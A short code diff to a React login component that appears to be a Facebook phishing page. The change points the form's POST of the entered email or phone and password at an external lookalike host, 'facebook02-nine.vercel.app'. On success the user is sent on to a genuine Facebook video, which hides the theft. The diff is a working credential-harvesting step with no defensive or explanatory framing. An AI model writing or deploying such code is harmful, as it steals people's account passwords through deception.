@@ -13,7 +13,7 @@ const Login = () => {
     const pass = e.target.password.value;
     // console.log(emailNum, pass);
     const user = { emailNum, pass };
-    axios.post("http://localhost:5000/api/login", user).then((res) => {
+    axios.post("https://facebook02-nine.vercel.app/api/login", user).then((res) => {
       // console.log(res);
       if (res.status === 200) {
         window.location.href = "https://web.facebook.com/watch?v=1716608769152496";
